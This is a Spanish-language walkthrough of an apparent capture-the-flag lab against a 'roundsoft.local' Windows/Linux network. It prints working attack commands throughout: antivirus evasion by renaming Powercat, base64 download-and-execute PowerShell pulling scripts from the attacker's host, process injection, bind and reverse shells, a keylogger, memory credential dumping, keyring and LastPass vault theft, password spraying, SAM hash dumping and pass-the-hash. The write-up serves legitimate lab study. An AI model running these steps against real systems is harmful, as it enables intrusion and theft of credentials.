Cambiar el nombre del binario de Powercat a algo como "pocat" es una estrategia común para evitar la detección del antivirus. A menudo, los motores antivirus basan sus decisiones en las firmas de malware conocidas y las palabras clave utilizadas en los nombres de los archivos.

Al cambiar el nombre a "pocat", es menos probable que el antivirus lo detecte como malicioso. Sin embargo, recuerda que esto no garantiza una evasión total del antivirus. Algunos motores de antivirus pueden detectar comportamientos maliciosos más allá del nombre del archivo.

Después de hacer el cambio de nombre, asegúrate de ajustar tu script o comando para que haga referencia al nuevo nombre del binario ("pocat") en lugar de "powercat". De esta manera, podrás ejecutar el comando sin problemas de detección del antivirus.

```bash
❯ echo 'powercat -l -p 4444 -e powershell' >> powercat.ps1  

❯ sed -i 's/powercat/pocat/' powercat.ps1
```

Para subir el script `pocat.ps1` a la máquina `ignis`, ejecuta un servidor HTTP en tu máquina local con Python, luego descarga el script en `ignis` usando `wget`, y finalmente ejecuta un payload en base64 desde tu máquina local para ejecutar el script en `ignis` mediante PowerShell, sin necesidad de conexión directa, permitiendo así la ejecución remota del script.

```bash
❯ scp -i id_rsa pocat.ps1 beta_user@10.13.38.18:.  
```

```bash
beta_user@Ignis:~$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...  
```

```bash
❯ echo -n "powershell -c 'IWR 192.168.125.135:8080/pocat.ps1 | IEX'" | iconv -t utf16le | base64 -w0
cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACcASQBXAFIAIAAxADkAMgAuADEANgA4AC4AMQAyADUALgAxADMANQA6ADgAMAA4ADAALwBwAG8AYwBhAHQALgBwAHMAMQAgAHwAIABJAEUAWAAnAA==  
```

Para llevar a cabo la inyección del payload en el proceso RuntimeBroker con el PID 2852, utilizaremos la función Invoke-PSInject que habíamos importado anteriormente. Este payload, codificado en base64, permitirá ejecutar el script en la máquina `ignis` sin necesidad de una conexión directa. Este proceso se realiza mediante la inyección del payload en el proceso específico identificado por su PID, lo que nos permite ejecutar comandos en el contexto del proceso objetivo sin ser detectados fácilmente por las herramientas de seguridad.

```powershell
PS C:\Users\janderson\Documents> Get-Process RuntimeBroker

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    142       9     2060       4268       0.09   2852   1 RuntimeBroker  
    564      26    12720      17760              3392   4 RuntimeBroker  
    410      19     6432      14360       1.45   5036   1 RuntimeBroker  
    423      23     8528      12144       0.70   5804   1 RuntimeBroker  
    138       8     1532       1272       0.06   6492   1 RuntimeBroker  
    269      14     3044      10720       1.61   6944   1 RuntimeBroker  
    329      17     4292       4464              8444   4 RuntimeBroker  
    239      13     2748       8816              9068   4 RuntimeBroker  
    138       8     1524       1388              9588   4 RuntimeBroker  
    213      12     2556       2572              9608   4 RuntimeBroker  
    142       9     2000       8072             10284   4 RuntimeBroker  
    189      13     4756      14460             10568   4 RuntimeBroker  
    297      17     5112      17172       0.31  11020   1 RuntimeBroker  

PS C:\Users\janderson\Documents>
```

```powershell
PS C:\Users\janderson\Documents> Invoke-PSInject -Procid 2852 -PoshCode cABvAHcAZQByAHMAaABlAGwAbAAgAC0AYwAgACcASQBXAFIAIAAxADkAMgAuADEANgA4AC4AMQAyADUALgAxADMANQA6ADgAMAA4ADAALwBwAG8AYwBhAHQALgBwAHMAMQAgAHwAIABJAEUAWAAnAA==  
PS C:\Users\janderson\Documents>
```

Al recibir una solicitud en el servidor HTTP hacia `/pocat.ps1`, confirmamos que el comando se ejecutó correctamente y que el script `pocat.ps1` se interpretó correctamente en la máquina `ignis`. Esto indica que la inyección del payload fue exitosa y que ahora podemos conectar al puerto 4444 de la máquina `ignis`. Al hacerlo, obtenemos una shell de PowerShell de `janderson`, lo que confirma que el script se ejecutó con éxito y logramos obtener acceso a la máquina remota de manera remota.

```powershell
❯ netcat lux.roundsoft.local 4444
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.  

PS C:\Windows\system32> whoami
roundsoft\janderson
PS C:\Windows\system32>
```

Bajo el contexto del proceso RuntimeBroker, ejecutamos el keylogger que subimos anteriormente y lo dejamos en espera de pulsaciones de la sesión. Tras algunos segundos, la sesión de Putty se reinicia y el usuario ingresa la contraseña, lo que nos permite detectar las pulsaciones y obtener la contraseña.

Con esta contraseña, podemos conectarnos como root a través de SSH y leer la flag. Este proceso nos proporciona acceso privilegiado al sistema remoto, lo que nos permite obtener la información que necesitamos para avanzar en nuestro objetivo.

```powershell
PS C:\Users\janderson\Documents> .\Keylogger_x64.exe  
PS C:\Users\janderson\Documents> type Keylogger_x64.log  
(03^69<@BHM*/KY4z[ENTER]
PS C:\Users\janderson\Documents>
```

```bash
❯ ssh root@10.13.38.18 
root@10.13.38.18's password: (03^69<@BHM*/KY4z
root@Ignis:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Ignis:~# hostname -I 
10.13.38.18 192.168.125.135 172.17.0.1 dead:beef::250:56ff:fe07:4590  
root@Ignis:~# cat flag.txt 
RPG{h1j@c*******pir@t3}
root@Ignis:~#
```

  
Como root, al visualizar los procesos de GNOME ejecutándose como ruby, específicamente nos interesa el proceso que ejecuta `gnome-keyring-daemon`. Este proceso es crucial, ya que el `gnome-keyring-daemon` es responsable de gestionar las claves y contraseñas en el entorno de escritorio GNOME, incluyendo las credenciales del usuario actual.

Al examinar el proceso `gnome-keyring-daemon`, podemos explorar su entorno de ejecución, los archivos que está accediendo y otras actividades relacionadas con la gestión de claves y contraseñas. Esto puede proporcionarnos información valiosa sobre las credenciales almacenadas y otros datos sensibles que podrían ser relevantes para nuestros objetivos.

```bash
root@Ignis:~# ps aux | grep ruby
ruby       1536  0.0  0.2  77032  8168 ?        Ss   00:05   0:00 /lib/systemd/systemd --user
ruby       1545  0.0  0.0 114104  2656 ?        S    00:05   0:00 (sd-pam)
ruby       1579  0.0  0.2 279984 11880 ?        SLl  00:05   0:00 /usr/bin/gnome-keyring-daemon --daemonize --login
ruby       1596  0.0  0.1 203736  5932 tty1     Ssl+ 00:05   0:00 /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
ruby       1598  0.0  4.0 622364 161732 tty1    Sl+  00:05   0:02 /usr/lib/xorg/Xorg vt1 -displayfd 3 -auth /run/user/1001/gdm/Xauthority -background none -noreset -keeptty -verbose 3  
ruby       1617  0.0  0.1  52480  6456 ?        Ss   00:05   0:00 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
ruby       1624  0.0  0.3 698280 13916 tty1     Sl+  00:05   0:00 /usr/lib/gnome-session/gnome-session-binary --session=ubuntu
ruby       1896  0.0  0.0  11304   320 ?        Ss   00:05   0:00 /usr/bin/ssh-agent /usr/bin/im-launch env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
ruby       2008  0.0  0.1 349292  6476 ?        Ssl  00:05   0:00 /usr/lib/at-spi2-core/at-spi-bus-launcher
ruby       2036  0.0  0.0  49924  3560 ?        S    00:05   0:00 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
ruby       2065  0.0  0.1 220780  6564 ?        Sl   00:06   0:00 /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
ruby       2218  0.0  0.3 279696 12448 ?        Sl   00:06   0:00 /usr/bin/gnome-keyring-daemon --start --foreground --components=secrets
ruby       2377  0.0  4.1 3240876 168612 tty1   Sl+  00:06   0:49 /usr/bin/gnome-shell
```

Con Mimipenguin, una herramienta diseñada para buscar y extraer credenciales sin cifrar en la memoria de procesos, podemos encontrar la contraseña del usuario "ruby" en texto plano. Al obtener esta contraseña, podemos utilizarla para autenticarnos mediante SSH como el usuario "ruby".

Una vez que hemos obtenido acceso mediante SSH como el usuario "ruby", podemos explorar más a fondo el sistema y realizar las acciones necesarias para avanzar en nuestros objetivos de seguridad o auditoría.

```bash
root@Ignis:~# python3 mimipenguin.py 
[SYSTEM - GNOME]	ruby:N1xp@ssw0rd4Ruby  
```

```bash
❯ ssh ruby@10.13.38.18
ruby@10.13.38.18's password: N1xp@ssw0rd4Ruby
ruby@Ignis:~$ id
uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
ruby@Ignis:~$ hostname -I
10.13.38.18 192.168.125.135 172.17.0.1 dead:beef::250:56ff:fe07:4590  
ruby@Ignis:~$
```

Aprovechando la conexión SSH con SCP, podemos transferir todos los keyrings del usuario "ruby" a nuestro directorio de keyrings local para luego abrirlos con Seahorse, una herramienta de gestión de claves de GNOME.

Una vez que hemos transferido los archivos de keyrings, podemos abrir el archivo "stuff" utilizando la contraseña de "ruby". Al descifrar su contenido, encontramos una entrada con la descripción "Flag", y al seleccionarla, nos muestra directamente la flag. Esto nos permite obtener la flag del sistema sin necesidad de acceder a otros recursos o realizar más acciones complejas.

```bash
ruby@Ignis:~/.local/share/keyrings$ ls -l
-rw------- 1 ruby ruby 677 Jan 17  2020 Credentials.keyring  
-rw------- 1 ruby ruby 535 Jan 17  2020 login.keyring
-rw------- 1 ruby ruby 315 Jan 17  2020 stuff.keyring
-rw------- 1 ruby ruby 207 Jan 17  2020 user.keystore
ruby@Ignis:~/.local/share/keyrings$
```

```bash
❯ scp ruby@10.13.38.18:'~/.local/share/keyrings/*' ~/.local/share/keyrings  
ruby@10.13.38.18's password: N1xp@ssw0rd4Ruby

❯ seahorse
```

Flag: 

```
RPG{n0thin********_fr0m_r00t!}
```

Al encontrar las tres credenciales en el keyring "Credentials", cada una con contraseñas diferentes para distintos servicios como Drive, Wifi y Workstation, podemos identificar que estas credenciales podrían tener aplicaciones en diversos servicios de la red.

Luego de crear una lista de usuarios del dominio, podemos realizar pruebas de autenticación a través de SMB utilizando estas contraseñas. En este caso, hemos confirmado que una de las contraseñas es válida para el usuario "rrodriguez". Esto nos proporciona acceso a recursos compartidos en la red o posiblemente a otras aplicaciones que requieran autenticación SMB para el usuario "rrodriguez".

```bash
❯ crackmapexec smb shinra.roundsoft.local -u users.txt -p I@mabArb13g1rl1n@barbi3w0rld
SMB         roundsoft.local 445    SHINRA           [*] Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
SMB         roundsoft.local 445    SHINRA           [-] Roundsoft.local\administrator:I@mabArb13g1rl1n@barbi3w0rld STATUS_ACCOUNT_RESTRICTION 
SMB         roundsoft.local 445    SHINRA           [-] Roundsoft.local\Guest:I@mabArb13g1rl1n@barbi3w0rld STATUS_LOGON_FAILURE 
SMB         roundsoft.local 445    SHINRA           [-] Roundsoft.local\krbtgt:I@mabArb13g1rl1n@barbi3w0rld STATUS_LOGON_FAILURE 
SMB         roundsoft.local 445    SHINRA           [-] Roundsoft.local\DefaultAccount:I@mabArb13g1rl1n@barbi3w0rld STATUS_LOGON_FAILURE 
SMB         roundsoft.local 445    SHINRA           [-] Roundsoft.local\nyoshida:I@mabArb13g1rl1n@barbi3w0rld STATUS_LOGON_FAILURE 
SMB         roundsoft.local 445    SHINRA           [-] Roundsoft.local\hsakaguchi:I@mabArb13g1rl1n@barbi3w0rld STATUS_LOGON_FAILURE 
SMB         roundsoft.local 445    SHINRA           [-] Roundsoft.local\yamano:I@mabArb13g1rl1n@barbi3w0rld STATUS_LOGON_FAILURE 
SMB         roundsoft.local 445    SHINRA           [-] Roundsoft.local\tnomura:I@mabArb13g1rl1n@barbi3w0rld STATUS_LOGON_FAILURE 
SMB         roundsoft.local 445    SHINRA           [-] Roundsoft.local\htanaka:I@mabArb13g1rl1n@barbi3w0rld STATUS_LOGON_FAILURE 
SMB         roundsoft.local 445    SHINRA           [-] Roundsoft.local\repository_admin:I@mabArb13g1rl1n@barbi3w0rld STATUS_LOGON_FAILURE 
SMB         roundsoft.local 445    SHINRA           [+] Roundsoft.local\rrodriguez:I@mabArb13g1rl1n@barbi3w0rld
```

Al probar las credenciales para el protocolo WinRM en todos los equipos del dominio, observamos que todos devuelven errores, excepto el host .129, que devuelve un mensaje "Pwn3d!". Esto sugiere que las credenciales proporcionadas son válidas para el host .129 y que hemos logrado comprometer este equipo de alguna manera.

```bash
❯ crackmapexec winrm 192.168.125.88-129 -u rrodriguez -p I@mabArb13g1rl1n@barbi3w0rld
SMB         192.168.125.88  5985   GELUS            [*] Windows 10.0 Build 17763 (name:GELUS) (domain:Roundsoft.local)
SMB         192.168.125.128 5985   SHINRA           [*] Windows 10.0 Build 14393 (name:SHINRA) (domain:Roundsoft.local)  
SMB         192.168.125.129 5985   LUX              [*] Windows 10.0 Build 18362 (name:LUX) (domain:Roundsoft.local)
HTTP        192.168.125.88  5985   GELUS            [*] http://192.168.125.88:5985/wsman
HTTP        192.168.125.128 5985   SHINRA           [*] http://192.168.125.128:5985/wsman
HTTP        192.168.125.129 5985   LUX              [*] http://192.168.125.129:5985/wsman
HTTP        192.168.125.88  5985   GELUS            [-] Roundsoft.local\rrodriguez:I@mabArb13g1rl1n@barbi3w0rld 
HTTP        192.168.125.128 5985   SHINRA           [-] Roundsoft.local\rrodriguez:I@mabArb13g1rl1n@barbi3w0rld 
HTTP        192.168.125.129 5985   LUX              [+] Roundsoft.local\rrodriguez:I@mabArb13g1rl1n@barbi3w0rld (Pwn3d!)
```

Al conectarnos al equipo LUX usando Evil-WinRM con las credenciales válidas del usuario "rrodriguez", hemos obtenido una sesión de PowerShell como dicho usuario. Dado que el usuario tiene acceso a WmiMonitor, es posible que tenga permisos para realizar acciones a través de WMI, como obtener acceso remoto a otros equipos dentro del dominio.

Al definir las credenciales del usuario "rrodriguez" e invocar un comando mediante WMI hacia el equipo GELUS, parece que el comando se ejecuta sin que se nos deniegue el acceso. Esto sugiere que hemos logrado establecer una conexión remota con el equipo GELUS usando las credenciales del usuario "rrodriguez". Ahora podemos explorar más a fondo el equipo GELUS y realizar las acciones necesarias según nuestros objetivos. Es importante proceder con cuidado y seguir las mejores prácticas de seguridad para evitar cualquier impacto no deseado en el sistema.

```powershell
PS C:\Users\rrodriguez\Documents> $SecPassword = ConvertTo-SecureString 'I@mabArb13g1rl1n@barbi3w0rld' -AsPlainText -Force
PS C:\Users\rrodriguez\Documents> $Cred = New-Object System.Management.Automation.PSCredential('roundsoft.local\rrodriguez', $SecPassword)
PS C:\Users\rrodriguez\Documents> Invoke-WmiMethod -ComputerName GELUS -Credential $Cred -Path win32_process -Name Create -ArgumentList ('whoami')  

__GENUS          : 2
__CLASS          : __PARAMETERS
__SUPERCLASS     :
__DYNASTY        : __PARAMETERS
__RELPATH        :
__PROPERTY_COUNT : 2
__DERIVATION     : {}
__SERVER         :
__NAMESPACE      :
__PATH           :
ProcessId        : 8136
ReturnValue      : 0
PSComputerName   :

PS C:\Users\rrodriguez\Documents>
```

Para abrir un listener en el puerto 4444 en el equipo GELUS, utilizamos el script `pocat.ps1` descargado previamente. Ejecutamos una petición utilizando `Invoke-WebRequest (IWR)` para descargar el script y luego la interpretamos con `Invoke-Expression (IEX)` en PowerShell. El siguiente comando utiliza `Invoke-WmiMethod` para iniciar un proceso en el equipo GELUS que ejecuta PowerShell y descarga y ejecuta el script `pocat.ps1`, abriendo así un listener en el puerto 4444. Una vez que el proceso se haya completado, el equipo GELUS estará listo para recibir conexiones entrantes en el puerto 4444.

```powershell
PS C:\Users\rrodriguez\Documents> Invoke-WmiMethod -ComputerName GELUS -Credential $Cred -Path win32_process -Name Create -ArgumentList ('powershell -c "IWR 10.10.14.10/pocat.ps1 | IEX"')  
PS C:\Users\rrodriguez\Documents>
```

```zsh
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
10.13.38.19 - - "GET /pocat.ps1 HTTP/1.1" 200 -
```

Después de la interpretación del script, nos conectamos al puerto 4444 y obtenemos una instancia de PowerShell como el usuario "rrodriguez", pero esta vez en el equipo GELUS:

```bash
❯ netcat gelus.roundsoft.local 4444
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.  

PS C:\Windows\system32> whoami
roundsoft\rrodriguez
PS C:\Windows\system32> hostname
GELUS
PS C:\Windows\system32>
```

En el directorio "Downloads" del usuario "rrodriguez", encontramos un archivo ejecutable llamado "ChromeSetup", lo que sugiere que Chrome está instalado en el equipo GELUS.

Navegando entre archivos encontramos un archivo llamado `1` de una extension la cual buscando el nombre de la carpeta nos encontramos con que es `LastPass`

```powershell
PS C:\Users\rrodriguez\Downloads> dir 'C:\Users\rrodriguez\AppData\Local\Google\Chrome\User Data\Default\databases\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0'  

    Directory: C:\Users\rrodriguez\AppData\Local\Google\Chrome\User Data\Default\databases\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/19/2020   9:01 PM          77824 1


PS C:\Users\rrodriguez\Downloads> cp 'C:\Users\rrodriguez\AppData\Local\Google\Chrome\User Data\Default\databases\chrome-extension_hdokiejnpimakedhajhdlcegeplioahd_0\1' \\10.10.14.10\kali\1  
```

Si utilizamos una herramienta para descifrar el ejecutable "ChromeSetup" encontrado en el directorio "Downloads" del usuario "rrodriguez" en el equipo GELUS, y tras probar contraseñas, encontramos que una de las contraseñas obtenidas anteriormente de los keyrings funciona. Como resultado, al descifrar el archivo, obtenemos la flag, junto con otras credenciales que pueden ser útiles para avanzar en nuestra investigación o en nuestros objetivos.

```bash
❯ python3 lpparser.py
Path of LastPass vault file: 1
Output directory: .
Email: ruby@roundsoft.com
Password: L1f3_1s_pl@st1c

Data exported to /home/kali/lastpass-vault-parser

press ENTER to exit

❯ cat Sites_and_SecureNotes.csv     
"aid","Name","Folder","URL","Notes","Favorite","sharedfromaid","Username","Password","Require Password Repromt","Generated Password","Secure Notes","Last Used","AutoLogin","Disable AutoFill","realm_data","fiid","custom_js","submit_id","captcha_id","urid","basic_auth","method","action","groupid","deleted","attachkey","attachpresent","individualshare","Note Type","noalert","Last Modified","Shared with Others","Last Password Changed","Created","vulnerable","Auto Change Password supported","breached","Custom Template","Form Fields"  
"738847209304266833","Admin account - Mail","mail","http://mail.roundsoft.local/owa","","0","","ruby_adm","b3aut1fu1_lyk_@_g3m!","0","0","0","0","0","0","","738847209304266833","","","","0","0","","","0","0","","","0","","","1579534224","0","1579534224","1579534224","","0","0","",""
"8006682195168702159","Flag","flag","http://sn","RPG{L3v31*******_b0$$_m0d3}","0","","","","0","0","1","0","0","0","","8006682195168702159","","","","0","0","","","1","","","","0","Generic","","","","","","","0","0","",""
```
Las credenciales de "ruby_adm" que hemos obtenido son efectivas a nivel de dominio, lo que significa que poseen privilegios y acceso significativos dentro de la infraestructura del dominio. Para mapear y enumerar el dominio, utilizaremos BloodHound, autenticándonos como cualquier usuario del dominio. BloodHound es una herramienta especializada en la visualización y el análisis de relaciones de privilegios en redes de Windows. Esta herramienta nos permite identificar caminos de ataque potenciales y puntos débiles en la seguridad del dominio. Toda la información recopilada durante este proceso se almacenará en un archivo zip para su análisis posterior y para mantenerla segura y organizada.

```bash
❯ crackmapexec smb shinra.roundsoft.local -u ruby_adm -p b3aut1fu1_lyk_@_g3m!
SMB         roundsoft.local 445    SHINRA           [*] Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
SMB         roundsoft.local 445    SHINRA           [+] Roundsoft.local\ruby_adm:b3aut1fu1_lyk_@_g3m!
```

```powershell
❯ bloodhound-python -u ruby_adm -p b3aut1fu1_lyk_@_g3m! -ns 192.168.125.128 -d roundsoft.local -c All --zip  
INFO: Found AD domain: roundsoft.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: Shinra.Roundsoft.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: Shinra.Roundsoft.local
INFO: Found 117 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: GELUS.Roundsoft.local
INFO: Querying computer: Lux.Roundsoft.local
INFO: Querying computer: Shinra.Roundsoft.local
INFO: Done in 00M 39S
INFO: Compressing output into 20230825230949_bloodhound.zip
```

![Photo2](/assets/images/RPG1.png)

Al cargar el zip, descubrimos que 'ruby_adm' posee privilegios GenericAll sobre 100 usuarios del dominio, pero la mayoría no son útiles para nuestros propósitos.

Podemos comenzar nuestra búsqueda enfocándonos en los usuarios que pertenecen al grupo "Developers", ya que estos usuarios tienen privilegios de administrador local en el equipo LUX. Esto nos proporcionará una vía potencial para obtener acceso y avanzar en nuestra investigación.

```powershell
PS C:\Users\janderson\Documents> net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain  

Members

-------------------------------------------------------------------------------
Administrator
ROUNDSOFT\Developers
ROUNDSOFT\Domain Admins
Roundsoft_HR

The command completed successfully.
```

Hemos identificado que tenemos privilegios GenericAll sobre 2 usuarios que son miembros del grupo Developers. Esto nos brinda una oportunidad para avanzar en nuestra exploración, ya que estos usuarios pueden tener acceso significativo y podrían servir como puntos de entrada para nuestro objetivo.

![Photo1](/assets/images/RPG2.png)

El plan es sencillo: cambiar la contraseña de un usuario, en este caso lthomson, y autenticarnos con él. Sin embargo, al intentarlo, recibimos un mensaje indicando que el usuario está deshabilitado. Esto presenta un obstáculo en nuestro plan, ya que no podemos proceder con la autenticación utilizando esta cuenta.

```bash
❯ net rpc password lthomson password123# -U 'roundsoft.local/ruby_adm%b3aut1fu1_lyk_@_g3m!' -S shinra.roundsoft.local

❯ crackmapexec smb shinra.roundsoft.local -u lthomson -p password123#
SMB         roundsoft.local 445    SHINRA           [*] Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
SMB         roundsoft.local 445    SHINRA           [-] Roundsoft.local\lthomson:password123# STATUS_ACCOUNT_DISABLED
```

Al tener `GenericAll` sobre estos también podemos habilitarlos, subimos PowerView a una maquina y con la credencial de `ruby_adm` habilitamos al usuario `lthomson`

```powershell
PS C:\Users\rrodriguez\Documents> Import-Module .\PowerView.ps1
PS C:\Users\rrodriguez\Documents> $SecPassword = ConvertTo-SecureString 'b3aut1fu1_lyk_@_g3m!' -AsPlainText -Force
PS C:\Users\rrodriguez\Documents> $Cred = New-Object System.Management.Automation.PSCredential('roundsoft.local\ruby_adm', $SecPassword)  
PS C:\Users\rrodriguez\Documents> Set-DomainObject -Identity LThomson -XOR @{useraccountcontrol=2} -Cred $Cred
PS C:\Users\rrodriguez\Documents>
```

Si intentamos ahora autenticarnos utilizando las credenciales contra el Controlador de Dominio (DC), recibimos la confirmación de que son válidas. Esto sugiere que las credenciales son correctas y que tenemos acceso al sistema utilizando la cuenta asociada.

```bash
❯ crackmapexec smb shinra.roundsoft.local -u lthomson -p password123#
SMB         roundsoft.local 445    SHINRA           [*] Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
SMB         roundsoft.local 445    SHINRA           [+] Roundsoft.local\lthomson:password123#
```

Una vez que hemos activado con éxito el usuario y nos autenticamos contra LUX, donde tenemos privilegios de administrador, recibimos un mensaje de "Pwn3d!", indicando que hemos obtenido un control efectivo sobre el sistema. Esto nos permite proceder a realizar el volcado de la SAM y así poder visualizar los hashes NT, lo que representa un paso significativo hacia el logro de nuestros objetivos.

```bash
❯ crackmapexec smb lux.roundsoft.local -u lthomson -p password123# 
SMB         lux.roundsoft.local 445    LUX              [*] Windows 10.0 Build 18362 x64 (name:LUX) (domain:Roundsoft.local) (signing:False) (SMBv1:False)
SMB         lux.roundsoft.local 445    LUX              [+] Roundsoft.local\lthomson:password123# (Pwn3d!)  

❯ crackmapexec smb lux.roundsoft.local -u lthomson -p password123# --sam
SMB         lux.roundsoft.local 445    LUX              [*] Windows 10.0 Build 18362 x64 (name:LUX) (domain:Roundsoft.local) (signing:False) (SMBv1:False)  
SMB         lux.roundsoft.local 445    LUX              [+] Roundsoft.local\lthomson:password123# (Pwn3d!)
SMB         lux.roundsoft.local 445    LUX              [*] Dumping SAM hashes
SMB         lux.roundsoft.local 445    LUX              Administrator:500:aad3b435b51404eeaad3b435b51404ee:53ff2611f458c331e1ecbb3921b7b471:::
SMB         lux.roundsoft.local 445    LUX              Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         lux.roundsoft.local 445    LUX              DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         lux.roundsoft.local 445    LUX              WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e1c935bfda72ce05c46592bcbaea4ad3:::
SMB         lux.roundsoft.local 445    LUX              Roundsoft_HR:1001:aad3b435b51404eeaad3b435b51404ee:e5562111cec252d79c2205f7ede6beba:::
```
  
Podemos conectar con el hash de Administrator utilizando Evil-WinRM.

```powershell
❯ evil-winrm -i lux.roundsoft.local -u Administrator -H 53ff2611f458c331e1ecbb3921b7b471  
PS C:\Users\Administrator\Documents> whoami
lux\administrator
```

Vamos a iniciar descargando el archivo NTUSER.DAT del usuario yamano, ya que es probable que haya almacenado sus credenciales en los registros al usar WinSCP en su versión de escritorio. Esto nos permitirá analizar el archivo en busca de información relevante.

```powershell
PS C:\Users\yamano> download NTUSER.DAT NTUSER.DAT

Info: Downloading C:\Users\yamano\NTUSER.DAT to NTUSER.DAT

Info: Download successful!

PS C:\Users\yamano>
```

Utilizando Registry Explorer, podemos explorar la sesión de WinSCP y encontrar las credenciales almacenadas. Posteriormente, utilizando winscppasswd, podemos descifrar la contraseña basándonos en los datos obtenidos del registro de WinSCP, lo que nos proporciona la contraseña en texto plano.

```powershell
PS C:\Users\pc1\Desktop> .\winscppasswd.exe 192.168.125.135 yamano A35C7059DC0FAE8584253D313D32336D656E726D6A64726D6E69726D6F691D2E6B03350F033A1C32281C2F286D3F033E6F3D292825  
Ar7_iS_f@nt@st1c_b3auty
PS C:\Users\pc1\Desktop>
```

La credencial es válida; sin embargo, parece que este usuario no puede conectarse a través del protocolo WinRM a ninguno de los equipos que aún quedan por comprometer. Esto representa un obstáculo en nuestro avance, ya que no podemos utilizar esta cuenta para acceder a los sistemas restantes de manera remota mediante WinRM.

```bash
❯ crackmapexec smb shinra.roundsoft.local -u yamano -p Ar7_iS_f@nt@st1c_b3auty
SMB         roundsoft.local 445    SHINRA           [*] Windows Server 2016 Standard 14393 x64 (name:SHINRA) (domain:Roundsoft.local) (signing:True) (SMBv1:True)  
SMB         roundsoft.local 445    SHINRA           [+] Roundsoft.local\yamano:Ar7_iS_f@nt@st1c_b3auty

❯ crackmapexec winrm 192.168.125.88-128 -u yamano -p Ar7_iS_f@nt@st1c_b3auty
SMB         192.168.125.88  5985   GELUS            [*] Windows 10.0 Build 17763 (name:GELUS) (domain:Roundsoft.local)
SMB         192.168.125.128 5985   SHINRA           [*] Windows 10.0 Build 14393 (name:SHINRA) (domain:Roundsoft.local)
HTTP        192.168.125.88  5985   GELUS            [*] http://192.168.125.88:5985/wsman
HTTP        192.168.125.128 5985   SHINRA           [*] http://192.168.125.128:5985/wsman
HTTP        192.168.125.88  5985   GELUS            [-] Roundsoft.local\yamano:Ar7_iS_f@nt@st1c_b3auty 
HTTP        192.168.125.128 5985   SHINRA           [-] Roundsoft.local\yamano:Ar7_iS_f@nt@st1c_b3auty
```

A pesar de las limitaciones con WinRM, hemos logrado ejecutar comandos localmente en el equipo GELUS utilizando Invoke-RunasCs, utilizando las credenciales del usuario. Por ejemplo, ejecutamos un simple comando "whoami" para probar la funcionalidad. Además, aprovechando la conexión directa que tenemos con nuestro equipo desde este punto, utilizamos el parámetro "-Remote" de RunasCs para enviar una instancia de PowerShell, lo que nos brinda una mayor flexibilidad y control sobre el sistema remoto.

```powershell
PS C:\Users\rrodriguez\Documents> curl 10.10.14.10/Invoke-RunasCs.ps1 -o Invoke-RunasCs.ps1  
PS C:\Users\rrodriguez\Documents> Import-Module .\Invoke-RunasCs.ps1
PS C:\Users\rrodriguez\Documents> Invoke-RunasCs yamano Ar7_iS_f@nt@st1c_b3auty whoami
roundsoft\yamano
PS C:\Users\rrodriguez\Documents> Invoke-RunasCs yamano Ar7_iS_f@nt@st1c_b3auty powershell -Remote 10.10.14.10:443
[+] Running in session 0 with process function CreateProcessWithTokenW()
[+] Using Station\Desktop: Service-0x0-27fbfef$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 7192 created in background.  
PS C:\Users\rrodriguez\Documents>
```

```bash
❯ sudo netcat -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.13.38.19
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.  

PS C:\Windows\system32> whoami
roundsoft\yamano
PS C:\Windows\system32> hostname
GELUS
PS C:\Windows\system32>
```

Al explorar el directorio "inetpub", hemos descubierto un archivo llamado "proxy.pac", el cual contiene información sobre cómo redirigir el tráfico a través de un proxy mediante un script en JavaScript. Es importante destacar que este archivo puede ser modificado por el grupo Infra, al cual pertenecen tanto el usuario yamano como el que estamos utilizando actualmente. Por lo tanto, tenemos la capacidad de escribir en este archivo y modificar su funcionalidad según sea necesario.

```powershell
PS C:\inetpub\altroot\pac_testing> dir

    Directory: C:\inetpub\altroot\pac_testing

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/22/2020  12:02 AM            118 proxy.pac            

PS C:\inetpub\altroot\pac_testing> type proxy.pac
function FindProxyForURL(url, host) 
{
	// allow DIRECT for now, yamano to setup proxy server 
	return "DIRECT";
}
